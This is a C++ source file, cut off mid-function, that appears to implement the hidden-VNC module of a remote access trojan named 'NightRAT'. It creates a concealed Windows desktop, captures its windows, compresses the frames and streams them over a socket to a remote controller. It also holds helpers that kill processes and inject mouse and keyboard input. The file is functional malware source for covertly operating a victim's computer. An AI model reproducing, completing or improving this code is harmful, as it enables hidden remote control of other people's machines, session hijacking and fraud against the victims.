#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <uxtheme.h>
#include <dwmapi.h>
#include <shlobj.h>
#include <shellapi.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <queue>
#include <deque>
#include <utility>
#include <condition_variable>
#include <iostream>
#include <filesystem>
#include <chrono>
#include <tlhelp32.h>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "uxtheme.lib")
#pragma comment(lib, "dwmapi.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;
namespace fs = std::filesystem;

#ifndef PW_RENDERFULLCONTENT
#define PW_RENDERFULLCONTENT 0x00000002
#endif

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct HVNCFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
    uint32_t dirtyX;
    uint32_t dirtyY;
    uint32_t dirtyWidth;
    uint32_t dirtyHeight;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
static const uint32_t FRAME_FORMAT_JPEG = 1;
static const uint32_t FRAME_FORMAT_JPEG_DIRTY = 2;
static const uint32_t FRAME_FORMAT_JPEG_COMPRESSED = 3;
static const uint32_t FRAME_FORMAT_JPEG_DIRTY_COMPRESSED = 4;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_socket = INVALID_SOCKET;
static int g_scalePercent = 50;
static int g_targetFps = 15;

static HDESK g_hHiddenDesktop = NULL;
static wstring g_desktopName = L"NightRAT_HiddenDesktop";

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

// Capture -> Encode -> Send pipeline.
// HBITMAP objects are cached in fixed slots and reused until the frame size changes.
struct BitmapSlot {
    HBITMAP hBmp = NULL;
    int width = 0;
    int height = 0;
    bool inUse = false;
};

struct CapturedFrame {
    int slotIndex;
    int width;
    int height;
    int scale;
    int fps;
    bool forceFull;
};

struct EncodedFrame {
    vector<unsigned char> jpeg;
    int width;
    int height;
    int scale;
    int fps;
    int dirtyX;
    int dirtyY;
    int dirtyWidth;
    int dirtyHeight;
    uint32_t format;
};

static const size_t MAX_CAPTURE_QUEUE = 2;
static const size_t MAX_SEND_QUEUE = 2;
static vector<BitmapSlot> g_bitmapSlots(2);
static deque<CapturedFrame> g_captureQueue;
static deque<EncodedFrame> g_sendQueue;
static mutex g_frameMutex;
static condition_variable g_frameCV;
static condition_variable g_sendCV;
static thread g_encodeThread;
static thread g_sendThread;
static atomic_bool g_encodeRunning(false);
static atomic_bool g_sendRunning(false);
static mutex g_logMutex;

// Input Worker
struct InputTask {
    string action;
    json cmd;
};
static deque<InputTask> g_inputQueue;
static mutex g_inputMutex;
static condition_variable g_inputCV;
static thread g_inputThread;
static atomic_bool g_inputRunning(false);

// ---------- Drag state ----------
static HWND  g_dragHwnd     = NULL;
static POINT g_dragStartPt  = {0, 0};
static POINT g_lastMousePos = {0, 0};
static RECT  g_dragStartRect = {0, 0, 0, 0};
static bool  g_dragging     = false;
static LRESULT g_dragHitTest = HTCLIENT;
static HWND  g_hLastWindow  = NULL;
static HWND  g_hCurrentFocus = NULL;
static HWND  g_mouseDownTarget[3] = { NULL, NULL, NULL };
static atomic_int g_staticFrameCount(0);
static atomic_bool g_forceFullFrame(false);
static atomic<DWORD> g_lastInteractiveFullFrameTick(0);

static bool g_shiftDown = false;
static bool g_ctrlDown = false;
static bool g_altDown = false;
static bool g_capsLock = false;
static bool g_leftButtonDown = false;
static HWND g_lbDownHwnd = NULL;

static void request_full_frame(bool immediate = true) {
    DWORD now = GetTickCount();
    if (immediate) {
        g_lastInteractiveFullFrameTick = now;
        g_forceFullFrame = true;
        return;
    }

    DWORD last = g_lastInteractiveFullFrameTick.load();
    if (last == 0 || now - last >= 120) {
        g_lastInteractiveFullFrameTick = now;
        g_forceFullFrame = true;
    }
}

// -----------------------------------------------------------------------

static bool safe_send_json(SOCKET sock, const json& data) {
    if (sock == INVALID_SOCKET) return false;
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump() + "\r\n";
    const char* ptr = serialized.c_str();
    int remaining = (int)serialized.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static void send_status(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json status;
    status["action"] = "hvnc_status";
    status["message"] = msg;
    safe_send_json(g_socket, status);
}

static void send_error(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json err;
    err["action"] = "hvnc_error";
    err["message"] = msg;
    safe_send_json(g_socket, err);
}

static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int height,
                                 int dirtyX, int dirtyY, int dirtyWidth, int dirtyHeight,
                                 uint32_t format, const vector<unsigned char>& jpegBytes) {
    if (jpegBytes.empty() || sock == INVALID_SOCKET) return false;

    HVNCFrameHeader frameHeader{};
    frameHeader.monitor     = 0;
    frameHeader.scale       = (uint32_t)scale;
    frameHeader.fps         = (uint32_t)fps;
    frameHeader.width       = (uint32_t)width;
    frameHeader.height      = (uint32_t)height;
    frameHeader.format      = format;
    frameHeader.dataSize    = (uint32_t)jpegBytes.size();
    frameHeader.dirtyX      = (uint32_t)dirtyX;
    frameHeader.dirtyY      = (uint32_t)dirtyY;
    frameHeader.dirtyWidth  = (uint32_t)dirtyWidth;
    frameHeader.dirtyHeight = (uint32_t)dirtyHeight;

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type      = PACKET_TYPE_HVNC_FRAME;
    packetHeader.size      = (uint32_t)(sizeof(HVNCFrameHeader) + jpegBytes.size());

    vector<unsigned char> packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(packet.data(), &packetHeader, sizeof(PacketHeader));
    memcpy(packet.data() + sizeof(PacketHeader), &frameHeader, sizeof(HVNCFrameHeader));
    memcpy(packet.data() + sizeof(PacketHeader) + sizeof(HVNCFrameHeader), jpegBytes.data(), jpegBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    const char* ptr = (const char*)packet.data();
    int remaining = (int)packet.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) return true;
    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static void initialize_visual_styles() {
    INITCOMMONCONTROLSEX icc{};
    icc.dwSize = sizeof(icc);
    icc.dwICC = ICC_WIN95_CLASSES | ICC_STANDARD_CLASSES | ICC_BAR_CLASSES | ICC_LISTVIEW_CLASSES | ICC_TREEVIEW_CLASSES;
    InitCommonControlsEx(&icc);
    SetThemeAppProperties(STAP_ALLOW_NONCLIENT | STAP_ALLOW_CONTROLS | STAP_ALLOW_WEBCONTENT);
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok) return -1;
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static bool bitmap_to_jpeg(HBITMAP hBmp, ULONG quality, vector<unsigned char>& bytes) {
    if (!ensure_gdiplus()) return false;
    static CLSID clsid;
    static bool clsidReady = false;
    if (!clsidReady) {
        if (get_encoder_clsid(L"image/jpeg", &clsid) < 0) return false;
        clsidReady = true;
    }
    Bitmap bmp(hBmp, NULL);
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) return false;
    EncoderParameters params;
    params.Count = 1;
    params.Parameter[0].Guid              = EncoderQuality;
    params.Parameter[0].Type             = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues   = 1;
    params.Parameter[0].Value            = &quality;
    if (bmp.Save(stream, &clsid, &params) != Ok) { stream->Release(); return false; }
    STATSTG stat;
    stream->Stat(&stat, STATFLAG_NONAME);
    bytes.resize((size_t)stat.cbSize.QuadPart);
    LARGE_INTEGER li = {0};
    stream->Seek(li, STREAM_SEEK_SET, NULL);
    ULONG read;
    stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
    stream->Release();
    return true;
}

static void ensure_desktop() {
    if (g_hHiddenDesktop) return;
    g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
    if (!g_hHiddenDesktop) {
        g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
    }
}

static void client_log(const string& msg) {
    lock_guard<mutex> lock(g_logMutex);
    cout << "[HVNC] " << msg << endl;
}

// -----------------------------------------------------------------------
//  Frame slot / queue helpers
// -----------------------------------------------------------------------
static void release_slot_locked(int slotIndex) {
    if (slotIndex >= 0 && slotIndex < (int)g_bitmapSlots.size()) {
        g_bitmapSlots[slotIndex].inUse = false;
    }
}

static bool has_free_frame_slot_locked() {
    for (const BitmapSlot& slot : g_bitmapSlots) {
        if (!slot.inUse) return true;
    }
    return !g_captureQueue.empty();
}

static int acquire_frame_slot_locked(HDC hdcScreen, int width, int height) {
    int slotIndex = -1;
    for (size_t i = 0; i < g_bitmapSlots.size(); ++i) {
        if (!g_bitmapSlots[i].inUse) {
            slotIndex = (int)i;
            break;
        }
    }

    while (slotIndex < 0 && !g_captureQueue.empty()) {
        CapturedFrame oldFrame = g_captureQueue.front();
        g_captureQueue.pop_front();
        release_slot_locked(oldFrame.slotIndex);
        for (size_t i = 0; i < g_bitmapSlots.size(); ++i) {
            if (!g_bitmapSlots[i].inUse) {
                slotIndex = (int)i;
                break;
            }
        }
    }

    if (slotIndex < 0) return -1;

    BitmapSlot& slot = g_bitmapSlots[slotIndex];
    if (!slot.hBmp || slot.width != width || slot.height != height) {
        if (slot.hBmp) {
            DeleteObject(slot.hBmp);
            slot.hBmp = NULL;
        }
        slot.hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
        slot.width = width;
        slot.height = height;
    }
    if (!slot.hBmp) return -1;

    slot.inUse = true;
    return slotIndex;
}

static void clear_frame_pipeline() {
    lock_guard<mutex> lock(g_frameMutex);
    while (!g_captureQueue.empty()) {
        release_slot_locked(g_captureQueue.front().slotIndex);
        g_captureQueue.pop_front();
    }
    g_sendQueue.clear();
    for (BitmapSlot& slot : g_bitmapSlots) {
        slot.inUse = false;
    }
}

static void release_all_bitmap_slots() {
    lock_guard<mutex> lock(g_frameMutex);
    g_captureQueue.clear();
    g_sendQueue.clear();
    for (BitmapSlot& slot : g_bitmapSlots) {
        if (slot.hBmp) {
            DeleteObject(slot.hBmp);
            slot.hBmp = NULL;
        }
        slot.width = 0;
        slot.height = 0;
        slot.inUse = false;
    }
}

static bool read_bitmap_pixels(HBITMAP hBmp, int width, int height, vector<uint32_t>& pixels) {
    if (!hBmp || width <= 0 || height <= 0) return false;

    BITMAPINFO bmi{};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    pixels.resize((size_t)width * (size_t)height);
    HDC hdc = GetDC(NULL);
    int rows = GetDIBits(hdc, hBmp, 0, (UINT)height, pixels.data(), &bmi, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);
    return rows == height;
}

static bool find_dirty_rect(const vector<uint32_t>& current, vector<uint32_t>& previous,
                            int width, int height, RECT& dirty, bool& forceFull) {
    forceFull = previous.size() != current.size();
    if (forceFull) {
        previous = current;
        dirty.left = 0;
        dirty.top = 0;
        dirty.right = width;
        dirty.bottom = height;
        return true;
    }

    if (memcmp(current.data(), previous.data(), current.size() * sizeof(uint32_t)) == 0) {
        return false;
    }

    int left = width;
    int top = height;
    int right = -1;
    int bottom = -1;

    const uint32_t* pCurr = current.data();
    const uint32_t* pPrev = previous.data();

    for (int y = 0; y < height; ++y) {
        const uint32_t* rowCurr = pCurr + (size_t)y * width;
        const uint32_t* rowPrev = pPrev + (size_t)y * width;

        if (memcmp(rowCurr, rowPrev, width * sizeof(uint32_t)) == 0) {
            continue;
        }

        if (y < top) top = y;
        if (y > bottom) bottom = y;

        for (int x = 0; x < width; ++x) {
            if (rowCurr[x] != rowPrev[x]) {
                if (x < left) left = x;
                if (x > right) right = x;
            }
        }
    }

    if (right < left || bottom < top) return false;

    previous = current;
    dirty.left = max(0, left - 4);
    dirty.top = max(0, top - 4);
    dirty.right = min(width, right + 5);
    dirty.bottom = min(height, bottom + 5);
    return true;
}

static bool copy_bitmap_region(HBITMAP hSource, int x, int y, int width, int height,
                               HBITMAP& hCrop, HDC hdcSource, HDC hdcCrop,
                               HGDIOBJ& hOldSource, HGDIOBJ& hOldCrop,
                               int& cropWidth, int& cropHeight) {
    if (!hSource || width <= 0 || height <= 0) return false;

    HDC hdcScreen = GetDC(NULL);
    if (!hCrop || cropWidth != width || cropHeight != height) {
        if (hCrop) {
            SelectObject(hdcCrop, hOldCrop);
            DeleteObject(hCrop);
            hCrop = NULL;
            hOldCrop = NULL;
        }
        hCrop = CreateCompatibleBitmap(hdcScreen, width, height);
        if (!hCrop) {
            ReleaseDC(NULL, hdcScreen);
            return false;
        }
        hOldCrop = SelectObject(hdcCrop, hCrop);
        cropWidth = width;
        cropHeight = height;
    }
    ReleaseDC(NULL, hdcScreen);

    hOldSource = SelectObject(hdcSource, hSource);
    BitBlt(hdcCrop, 0, 0, width, height, hdcSource, x, y, SRCCOPY);
    SelectObject(hdcSource, hOldSource);
    hOldSource = NULL;
    return true;
}

typedef NTSTATUS (NTAPI *pfnRtlGetCompressionWorkSpaceSize)(
    USHORT CompressionFormatAndEngine,
    PULONG CompressBufferWorkSpaceSize,
    PULONG CompressFragmentWorkSpaceSize
);

typedef NTSTATUS (NTAPI *pfnRtlCompressBuffer)(
    USHORT CompressionFormatAndEngine,
    PUCHAR SourceBuffer,
    ULONG SourceBufferLength,
    PUCHAR DestinationBuffer,
    ULONG DestinationBufferLength,
    ULONG ChunkSize,
    PULONG UncompressedChunkSize,
    PVOID WorkSpace
);

static bool compress_buffer(const std::vector<unsigned char>& input, std::vector<unsigned char>& output) {
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (!hNtDll) return false;

    auto RtlGetCompressionWorkSpaceSize = (pfnRtlGetCompressionWorkSpaceSize)GetProcAddress(hNtDll, "RtlGetCompressionWorkSpaceSize");
    auto RtlCompressBuffer = (pfnRtlCompressBuffer)GetProcAddress(hNtDll, "RtlCompressBuffer");

    if (!RtlGetCompressionWorkSpaceSize || !RtlCompressBuffer) return false;

    USHORT format = 2; // COMPRESSION_FORMAT_LZNT1
    ULONG workSpaceSize = 0, fragmentSize = 0;
    if (RtlGetCompressionWorkSpaceSize(format, &workSpaceSize, &fragmentSize) != 0) return false;

    std::vector<unsigned char> workSpace(workSpaceSize);
    ULONG maxCompressedSize = (ULONG)input.size() + (ULONG)(input.size() / 10) + 1024;
    std::vector<unsigned char> tempCompressed(maxCompressedSize);

    ULONG compressedSize = 0;
    NTSTATUS status = RtlCompressBuffer(
        format,
        (PUCHAR)input.data(),
        (ULONG)input.size(),
        (PUCHAR)tempCompressed.data(),
        maxCompressedSize,
        4096,
        &compressedSize,
        workSpace.data()
    );

    if (status == 0) { // STATUS_SUCCESS
        output.resize(4 + compressedSize);
        uint32_t originalSize = (uint32_t)input.size();
        std::memcpy(output.data(), &originalSize, 4);
        std::memcpy(output.data() + 4, tempCompressed.data(), compressedSize);
        return true;
    }
    return false;
}

static void kill_process_by_name(const wstring& exeName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);

    if (Process32FirstW(hSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, exeName.c_str()) == 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProc) {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                }
            }
        } while (Process32NextW(hSnap, &pe32));
    }
    CloseHandle(hSnap);
}

// -----------------------------------------------------------------------
//  Encode Worker Thread (Capture Queue -> JPEG Queue)
// -----------------------------------------------------------------------
static void encode_worker() {
    vector<uint32_t> previousPixels;
    vector<uint32_t> currentPixels;
    HDC hdcSource = CreateCompatibleDC(NULL);
    HDC hdcCrop = CreateCompatibleDC(NULL);
    HBITMAP hCrop = NULL;
    HGDIOBJ hOldSource = NULL;
    HGDIOBJ hOldCrop = NULL;
    int cropWidth = 0;
    int cropHeight = 0;

    while (g_encodeRunning) {
        CapturedFrame data{};
        HBITMAP hBmp = NULL;
        {
            unique_lock<mutex> lock(g_frameMutex);
            g_frameCV.wait(lock, [] { return !g_captureQueue.empty() || !g_encodeRunning; });
            if (!g_encodeRunning && g_captureQueue.empty()) break;

            while (g_captureQueue.size() > 1) {
                release_slot_locked(g_captureQueue.front().slotIndex);
                g_captureQueue.pop_front();
            }

            data = g_captureQueue.front();
            g_captureQueue.pop_front();
            if (data.slotIndex >= 0 && data.slotIndex < (int)g_bitmapSlots.size()) {
                hBmp = g_bitmapSlots[data.slotIndex].hBmp;
            }
        }

        vector<unsigned char> jpeg;
        RECT dirty = {0, 0, data.width, data.height};
        bool forceFull = false;
        bool hasDirty = false;
        bool encoded = false;
        uint32_t format = FRAME_FORMAT_JPEG;
        HBITMAP hEncode = hBmp;

        if (hBmp && read_bitmap_pixels(hBmp, data.width, data.height, currentPixels)) {
            hasDirty = find_dirty_rect(currentPixels, previousPixels, data.width, data.height, dirty, forceFull);
        } else {
            hasDirty = true;
            forceFull = true;
            previousPixels.clear();
        }

        if (data.forceFull) {
            hasDirty = true;
            forceFull = true;
            dirty.left = 0;
            dirty.top = 0;
            dirty.right = data.width;
            dirty.bottom = data.height;
        }

        if (hasDirty) {
            int dirtyWidth = dirty.right - dirty.left;
            int dirtyHeight = dirty.bottom - dirty.top;
            bool useDirty = !forceFull && dirtyWidth > 0 && dirtyHeight > 0 &&
                            (dirtyWidth * dirtyHeight) < ((data.width * data.height) * 85 / 100);

            if (useDirty &&
                copy_bitmap_region(hBmp, dirty.left, dirty.top, dirtyWidth, dirtyHeight,
                                   hCrop, hdcSource, hdcCrop, hOldSource, hOldCrop,
                                   cropWidth, cropHeight)) {
                hEncode = hCrop;
                format = FRAME_FORMAT_JPEG_DIRTY;
            } else {
                dirty.left = 0;
                dirty.top = 0;
                dirty.right = data.width;
                dirty.bottom = data.height;
                hEncode = hBmp;
                format = FRAME_FORMAT_JPEG;
            }

            encoded = hEncode && bitmap_to_jpeg(hEncode, (ULONG)data.scale, jpeg);
            g_staticFrameCount = 0;
        } else {
            g_staticFrameCount++;
        }

        {
            lock_guard<mutex> lock(g_frameMutex);
            release_slot_locked(data.slotIndex);
        }

        if (encoded) {
            std::vector<unsigned char> compressed;
            uint32_t finalFormat = format;
            if (compress_buffer(jpeg, compressed)) {
                if (compressed.size() < jpeg.size()) {
                    jpeg = std::move(compressed);
                    if (format == FRAME_FORMAT_JPEG) {
                        finalFormat = FRAME_FORMAT_JPEG_COMPRESSED;
                    } else if (format == FRAME_FORMAT_JPEG_DIRTY) {
                        finalFormat = FRAME_FORMAT_JPEG_DIRTY_COMPRESSED;
                    }
                }
            }

            lock_guard<mutex> lock(g_frameMutex);
            while (g_sendQueue.size() >= MAX_SEND_QUEUE) {
                g_sendQueue.pop_front();
            }
            g_sendQueue.push_back({std::move(jpeg), data.width, data.height, data.scale, data.fps,
                                   dirty.left, dirty.top, dirty.right - dirty.left, dirty.bottom - dirty.top,
                                   finalFormat});
            g_sendCV.notify_one();
        }
    }

    if (hCrop) {
        SelectObject(hdcCrop, hOldCrop);
        DeleteObject(hCrop);
    }
    DeleteDC(hdcSource);
    DeleteDC(hdcCrop);

    lock_guard<mutex> lock(g_frameMutex);
    while (!g_captureQueue.empty()) {
        release_slot_locked(g_captureQueue.front().slotIndex);
        g_captureQueue.pop_front();
    }
}

// -----------------------------------------------------------------------
//  Send Worker Thread (JPEG Queue -> Socket)
// -----------------------------------------------------------------------
static void send_worker() {
    while (g_sendRunning) {
        EncodedFrame data;
        {
            unique_lock<mutex> lock(g_frameMutex);
            g_sendCV.wait(lock, [] { return !g_sendQueue.empty() || !g_sendRunning; });
            if (!g_sendRunning && g_sendQueue.empty()) break;

            while (g_sendQueue.size() > 1) {
                g_sendQueue.pop_front();
            }

            data = std::move(g_sendQueue.front());
            g_sendQueue.pop_front();
        }

        safe_send_hvnc_frame(g_socket, data.scale, data.fps, data.width, data.height,
                             data.dirtyX, data.dirtyY, data.dirtyWidth, data.dirtyHeight,
                             data.format, data.jpeg);
    }
}

// -----------------------------------------------------------------------
//  Capture Loop (Producer)
// -----------------------------------------------------------------------
static void capture_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) {
        g_captureRunning = false;
        return;
    }

    if (!SetThreadDesktop(g_hHiddenDesktop)) {
        g_captureRunning = false;
        return;
    }

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
    HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);

    HDC hdcWin = CreateCompatibleDC(hdcScreen);
    HDC hdcFinal = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmpWin = NULL;
    HGDIOBJ hOldWin = NULL;
    int winBmpWidth = 0;
    int winBmpHeight = 0;
    vector<HWND> windows;
    DWORD lastWindowEnum = 0;
    DWORD lastFullFrame = 0;

    while (g_captureRunning) {
        DWORD start = GetTickCount();
        int scale, fps;
        {
            lock_guard<mutex> lock(g_captureMutex);
            scale = g_scalePercent;
            fps   = g_targetFps;
        }
        int staticFrames = g_staticFrameCount.load();
        if (staticFrames > 60) fps = 1;
        else if (staticFrames > 30) fps = max(1, fps / 4);
        else if (staticFrames > 12) fps = max(2, fps / 2);

        int dw = (sw * scale) / 100;
        int dh = (sh * scale) / 100;
        if (dw < 1) dw = 1; if (dh < 1) dh = 1;

        int slotIndex = -1;
        {
            lock_guard<mutex> lock(g_frameMutex);
            if (has_free_frame_slot_locked()) {
                slotIndex = acquire_frame_slot_locked(hdcScreen, dw, dh);
            }
        }

        if (slotIndex < 0) {
            DWORD interval = 1000 / (fps > 0 ? fps : 1);
            Sleep(max<DWORD>(5, interval / 2));
            continue;
        }

        // Fill background
        PatBlt(hdcMem, 0, 0, sw, sh, BLACKNESS);

        DWORD now = GetTickCount();
        DWORD fullFrameInterval = staticFrames > 30 ? 7000 : 3000;
        bool forceFullFrame = g_forceFullFrame.exchange(false) || (lastFullFrame == 0) || (now - lastFullFrame >= fullFrameInterval);
        DWORD enumInterval = staticFrames > 30 ? 1000 : 350;
        if (windows.empty() || forceFullFrame || now - lastWindowEnum >= enumInterval) {
            windows.clear();
            struct EnumParam {
                vector<HWND>* list;
            } param = { &windows };
            auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
                auto p = reinterpret_cast<EnumParam*>(lParam);
                if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
                    p->list->push_back(hwnd);
                }
                return TRUE;
            };
            EnumDesktopWindows(g_hHiddenDesktop, EnumCallback, reinterpret_cast<LPARAM>(&param));
            reverse(windows.begin(), windows.end());
            lastWindowEnum = now;
        }

        const UINT printFlags = PW_RENDERFULLCONTENT;

        for (HWND h : windows) {
            if (!IsWindow(h) || !IsWindowVisible(h)) continue;
            RECT rect;
            if (!GetWindowRect(h, &rect)) continue;
            int ww = rect.right - rect.left;
            int wh = rect.bottom - rect.top;
            if (ww <= 0 || wh <= 0) continue;

            if (!hbmpWin || ww > winBmpWidth || wh > winBmpHeight) {
                if (hbmpWin) {
                    SelectObject(hdcWin, hOldWin);
                    DeleteObject(hbmpWin);
                    hbmpWin = NULL;
                    hOldWin = NULL;
                }
                hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
                if (!hbmpWin) continue;
                hOldWin = SelectObject(hdcWin, hbmpWin);
                winBmpWidth = ww;
                winBmpHeight = wh;
            }

            PatBlt(hdcWin, 0, 0, ww, wh, BLACKNESS);
            bool printSuccess = PrintWindow(h, hdcWin, printFlags);
            if (!printSuccess) {
                printSuccess = PrintWindow(h, hdcWin, 0);
            }
            if (!printSuccess) {
                HDC hdcRealWin = GetWindowDC(h);
                if (hdcRealWin) {
                    BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
                    ReleaseDC(h, hdcRealWin);
                }
            }
            BitBlt(hdcMem, rect.left, rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
        }

        HGDIOBJ hOldFinal = SelectObject(hdcFinal, g_bitmapSlots[slotIndex].hBmp);
        SetStretchBltMode(hdcFinal, COLORONCOLOR);
        StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
        SelectObject(hdcFinal, hOldFinal);

        {
            lock_guard<mutex> lock(g_frameMutex);
            while (g_captureQueue.size() >= MAX_CAPTURE_QUEUE) {
                release_slot_locked(g_captureQueue.front().slotIndex);
                g_captureQueue.pop_front();
            }
            g_captureQueue.push_back({slotIndex, dw, dh, scale, fps, forceFullFrame});
            if (forceFullFrame) lastFullFrame = now;
            g_frameCV.notify_one();
        }

        DWORD elapsed  = GetTickCount() - start;
        DWORD interval = 1000 / (fps > 0 ? fps : 1);
        if (elapsed < interval) Sleep(interval - elapsed);
    }

    SelectObject(hdcMem, hOldMem);
    if (hbmpWin) {
        SelectObject(hdcWin, hOldWin);
        DeleteObject(hbmpWin);
    }
    DeleteObject(hbmpMem);
    DeleteDC(hdcMem);
    DeleteDC(hdcWin);
    DeleteDC(hdcFinal);
    ReleaseDC(NULL, hdcScreen);
}

// -----------------------------------------------------------------------
//  Yardımcı: Ekran koordinatını desktop koordinatına çevir
// -----------------------------------------------------------------------
static DWORD mouse_button_flag(int btn, bool down) {
    if (btn == 1) return down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
    if (btn == 2) return down ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
    return down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
}

static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData = 0) {
    INPUT input{};
    input.type = INPUT_MOUSE;
    input.mi.dx = normX;
    input.mi.dy = normY;
    input.mi.mouseData = mouseData;
    input.mi.dwFlags = flags | MOUSEEVENTF_ABSOLUTE;
    return SendInput(1, &input, sizeof(INPUT)) == 1;
}

static POINT screen_pt(int normX, int normY) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    POINT pt;
    pt.x = (normX * sw) / 65535;
    pt.y = (normY * sh) / 65535;
    return pt;
}

static UINT mouse_message_for_button(int btn, bool down, bool dblClick = false) {
    if (btn == 1) return down ? WM_RBUTTONDOWN : WM_RBUTTONUP;
    if (btn == 2) return down ? WM_MBUTTONDOWN : WM_MBUTTONUP;
    if (dblClick) return WM_LBUTTONDBLCLK;
    return down ? WM_LBUTTONDOWN : WM_LBUTTONUP;
}

static WPARAM mouse_wparam_for_button(int btn, bool down) {
    if (!down) return 0;
    if (btn == 1) return MK_RBUTTON;
    if (btn == 2) return MK_MBUTTON;
    return MK_LBUTTON;
}

static LPARAM key_lparam(WORD vk, bool keyUp) {
    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
    LPARAM lp = 1 | (scan << 16);
    if (keyUp) lp |= 0xC0000000;
    return lp;
}

static void set_key_down(BYTE state[256], int vk, bool down) {
    if (vk >= 0 && vk < 256) state[vk] = down ? 0x80 : 0;
}

static void apply_modifier_state(BYTE state[256], bool ctrlDown, bool altDown, bool shiftDown) {
    set_key_down(state, VK_CONTROL, ctrlDown);
    set_key_down(state, VK_LCONTROL, ctrlDown);
    set_key_down(state, VK_RCONTROL, ctrlDown);
    set_key_down(state, VK_MENU, altDown);
    set_key_down(state, VK_LMENU, altDown);
    set_key_down(state, VK_RMENU, altDown);
    set_key_down(state, VK_SHIFT, shiftDown);
